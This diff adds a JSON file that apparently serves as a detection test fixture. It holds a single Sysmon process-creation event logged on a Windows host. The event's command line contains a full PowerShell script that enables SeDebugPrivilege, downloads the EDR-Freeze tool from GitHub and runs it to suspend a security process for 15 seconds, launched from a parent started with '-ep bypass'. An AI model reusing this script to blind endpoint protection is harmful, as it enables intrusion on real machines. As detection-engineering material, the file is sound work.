@@ -1,0 +1,66 @@
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "System": {
+      "Provider": {
+        "#attributes": {
+          "Name": "Microsoft-Windows-Sysmon",
+          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+        }
+      },
+      "EventID": 1,
+      "Version": 5,
+      "Level": 4,
+      "Task": 1,
+      "Opcode": 0,
+      "Keywords": "0x8000000000000000",
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2025-12-23T13:22:10.044620Z"
+        }
+      },
+      "EventRecordID": 93733,
+      "Correlation": null,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 3320,
+          "ThreadID": 4216
+        }
+      },
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "swachchhanda",
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-18"
+        }
+      }
+    },
+    "EventData": {
+      "RuleName": "-",
+      "UtcTime": "2025-12-23 13:22:10.041",
+      "ProcessGuid": "0197231E-9782-694A-BA13-000000000D00",
+      "ProcessId": 19808,
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "FileVersion": "10.0.26100.7309 (WinBuild.160101.0800)",
+      "Description": "Windows PowerShell",
+      "Product": "Microsoft® Windows® Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "PowerShell.EXE",
+      "CommandLine": "\"powershell.exe\" & {# Enable SeDebugPrivilege\nAdd-Type -TypeDefinition @\\\"\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class TokenAdjuster {\n    [DllImport(\\\"\"advapi32.dll\\\"\", SetLastError = true)]\n    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);\n\n    [DllImport(\\\"\"advapi32.dll\\\"\", SetLastError = true)]\n    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);\n\n    [DllImport(\\\"\"advapi32.dll\\\"\", SetLastError = true)]\n    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,\n        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);\n\n    [StructLayout(LayoutKind.Sequential, Pack = 1)]\n    public struct TOKEN_PRIVILEGES {\n        public int PrivilegeCount;\n        public long Luid;\n        public int Attributes;\n    }\n\n    public const int SE_PRIVILEGE_ENABLED = 0x00000002;\n    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;\n    public const uint TOKEN_QUERY = 0x0008;\n\n    public static bool EnableSeDebugPrivilege() {\n        IntPtr hToken;\n        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))\n            return false;\n\n        long luid;\n        if (!LookupPrivilegeValue(null, \\\"\"SeDebugPrivilege\\\"\", out luid))\n            return false;\n\n        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();\n        tp.PrivilegeCount = 1;\n        tp.Luid = luid;\n        tp.Attributes = SE_PRIVILEGE_ENABLED;\n\n        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);\n    }\n}\n\\\"\"@\n\n$result = [TokenAdjuster]::EnableSeDebugPrivilege()\nif ($result) {\n    Write-Host \\\"\"SeDebugPrivilege enabled successfully.\\\"\" -ForegroundColor Green\n} else {\n    Write-Host \\\"\"Failed to enable SeDebugPrivilege.\\\"\" -ForegroundColor Red\n    exit 1\n}\n\n# Get basic process info\n$process = Get-Process -Name $SecurityHealthService -ErrorAction Stop\n$processName = $process.ProcessName\nWrite-Host \\\"\"Process Name: $processName)\\\"\"\nWrite-Host \\\"\"PID: $($process.Id)\\\"\"\n        \n# Get executable path and user info\n$query = \\\"\"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\\\"\"\n$wmiProcess = Get-WmiObject -Query $query\n\n$owner = $wmiProcess.GetOwner()\n    Write-Host \\\"\"User: $($owner.Domain)\\$($owner.User)\\\"\"\n\n\n# Get the folder of the current script\n$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition\n\n# Download latest EDR-Freeze package and extract (force replace)\n$downloadUrl = \\\"\"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\\\"\"\n$zipPath = Join-Path $scriptFolder \\\"\"EDR-Freeze_1.0.zip\\\"\"\nWrite-Host \\\"\"Downloading latest EDR-Freeze from $downloadUrl\\\"\" -ForegroundColor Cyan\ntry {\n    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop\n    Write-Host \\\"\"Download completed: $zipPath\\\"\" -ForegroundColor Green\n    $extractFolder = $scriptFolder\n    if (Test-Path $zipPath) {\n        Write-Host \\\"\"Extracting archive to $extractFolder (overwriting existing files)\\\"\" -ForegroundColor Cyan\n        if (Test-Path $extractFolder) {\n            # Ensure target exe not locked; attempt to stop any running instance silently\n            Get-Process -Name \\\"\"EDR-Freeze_1.0\\\"\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue\n        }\n        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null\n        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)\n        $archive = $null\n        try {\n            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)\n            foreach ($entry in $archive.Entries) {\n                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }\n                if ($entry.FullName.EndsWith('/')) { # directory entry\n                    $dirPath = Join-Path $extractFolder $entry.FullName\n                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }\n                    continue\n                }\n                $destPath = Join-Path $extractFolder $entry.FullName\n                $destDir = Split-Path $destPath -Parent\n                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }\n                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }\n                try {\n                    # Use static extension method (PowerShell 5.1 compatible)\n                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)\n                } catch {\n                    Write-Host \\\"\"Failed to extract entry $($entry.FullName): $_\\\"\" -ForegroundColor Yellow\n                }\n            }\n            Write-Host \\\"\"Extraction completed.\\\"\" -ForegroundColor Green\n        } finally {\n            if ($archive) { $archive.Dispose() }\n        }\n    }\n} catch {\n    Write-Host \\\"\"Failed to download or extract EDR-Freeze: $_\\\"\" -ForegroundColor Red\n}\n\n# Wait 15s before putting targeted process before putting it in the comma\nWrite-Host \\\"\"Waiting 15s before putting $processName in the comma\\\"\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \\\"\"Waiting 10s before putting $processName in the comma\\\"\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \\\"\"Waiting 5s before putting $processName in the comma\\\"\" -ForegroundColor Yellow\nStart-Sleep -Seconds 3\nWrite-Host \\\"\"Waiting 2s before putting $processName in the comma\\\"\" -ForegroundColor Yellow\nStart-Sleep -Seconds 2\n\n# Put targeted  process in the comma for 15s\n# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)\n$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |\n    Sort-Object LastWriteTime -Descending |\n    Select-Object -First 1 -ExpandProperty Name\nif (-not $edrFreezeExeName) {\n    Write-Host \\\"\"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\\\"\" -ForegroundColor Red\n    exit 1\n}\n\n$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName\nWrite-Host \\\"\"Using EDR-Freeze executable: $edrFreezeExeName\\\"\" -ForegroundColor Cyan\nWrite-Host \\\"\"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\\\"\" -ForegroundColor Yellow\nStart-Process -FilePath $edrFreezeExe -ArgumentList (\\\"\"$($process.Id) 15000\\\"\") | Out-Null}",
+      "CurrentDirectory": "C:\\Users\\xodih\\AppData\\Local\\Temp\\",
+      "User": "swachchhanda\\xodih",
+      "LogonGuid": "0197231E-5032-6940-AAE2-070000000000",
+      "LogonId": "0x7e2aa",
+      "TerminalSessionId": 1,
+      "IntegrityLevel": "High",
+      "Hashes": "MD5=9E590F2F936B4982CA6E7C77A6A38DF1,SHA256=7D17056459B9CEA517B5DA515790DF351B907E516B433CAFB869ABAFF83DB648,IMPHASH=68A9FF9C8D0D4655E46E1A7A190A41D2",
+      "ParentProcessGuid": "0197231E-7C2C-694A-0811-000000000D00",
+      "ParentProcessId": 25204,
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentCommandLine": "powershell  -ep bypass",
+      "ParentUser": "swachchhanda\\xodih"
+    }
+  }
+}
